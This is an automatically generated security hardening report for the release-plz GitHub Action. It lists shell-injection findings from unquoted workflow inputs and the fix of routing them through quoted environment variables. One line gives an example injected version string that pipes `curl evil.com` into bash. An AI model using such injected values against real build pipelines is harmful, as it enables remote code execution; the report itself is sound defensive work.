<!-- markdownlint-disable -->

# Hardening Report: release-plz--action/v0.5.137

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **release-plz--action/v0.5.137** was hardened automatically. 29 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): Direct expression interpolation of `${{ inputs.version }}` inside a `run:` shell command in the 'Install release-plz' step. The shell command is `cargo-binstall release-plz@${{ inputs.version }}`. An attacker-controlled version string is substituted directly into the shell before execution, enabling arbitrary command injection (e.g., a value like `0.3.167; curl evil.com | bash`). The fix is to route the value through an env var and quote it: `env: VERSION: ${{ inputs.version }}` then use `"$VERSION"` in the run block.

Locations:

- `action.yml:91`

### script-injection (severity: high)

Sub-rule (a): The 'Run release-plz' step's `run:` block directly interpolates multiple `${{ inputs.* }}` expressions into shell commands. Affected inputs include: `inputs.config` (e.g., `if [[ -n "${{ inputs.config }}" ]]` and `CONFIG_PATH=("--config" "${{ inputs.config }}")`), `inputs.verbose`, `inputs.dry_run`, `inputs.token` (e.g., `TOKEN=("--token" "${{ inputs.token }}")`), `inputs.forge`, `inputs.backend`, `inputs.registry`, `inputs.manifest_path`, `inputs.project_manifest`, and `inputs.command`. Any input containing shell metacharacters (`;`, `|`, `$(...)`, backticks) will be executed as shell code. All these inputs should be moved to `env:` variables and referenced as quoted `"$VAR"` in the script.

Locations:

- `action.yml:104`
- `action.yml:106`
- `action.yml:108`
- `action.yml:113`
- `action.yml:118`
- `action.yml:123`
- `action.yml:127`
- `action.yml:130`
- `action.yml:136`
- `action.yml:138`
- `action.yml:145`
- `action.yml:147`
- `action.yml:153`
- `action.yml:155`
- `action.yml:158`
- `action.yml:163`
- `action.yml:165`
- `action.yml:175`
- `action.yml:193`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.version }}" appears directly in run: block of step "Install release-plz"; move to env: map

Locations:

- `action.yml:87`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:98`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:100`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:102`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.verbose }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:107`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.dry_run }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:114`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.token }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:121`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.token }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:124`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.forge }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:129`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.forge }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:131`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.forge }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:132`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.backend }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:133`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.backend }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:136`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.backend }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:137`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.registry }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:143`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.registry }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:145`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.registry }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:146`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.manifest_path }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:151`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.manifest_path }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:153`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.manifest_path }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:154`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.project_manifest }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:155`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.project_manifest }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:157`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.project_manifest }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:158`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.command }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:163`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.command }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:163`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.command }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:190`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.command }}" appears directly in run: block of step "Run release-plz"; move to env: map

Locations:

- `action.yml:190`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed all script injection findings in hardened/action/action.yml:

1. 'Install release-plz' step: Moved `${{ inputs.version }}` to `env: INPUT_VERSION: ${{ inputs.version }}` and changed the run block to use `"release-plz@${INPUT_VERSION}"` (quoted).

2. 'Run release-plz' step: Moved all 10 `${{ inputs.* }}` expressions (config, verbose, dry_run, token, forge, backend, registry, manifest_path, project_manifest, command) to an `env:` block with INPUT_* prefixed names. All references in the shell script were updated from `${{ inputs.X }}` to `"$INPUT_X"` (properly quoted), eliminating all direct expression interpolation in run: blocks.

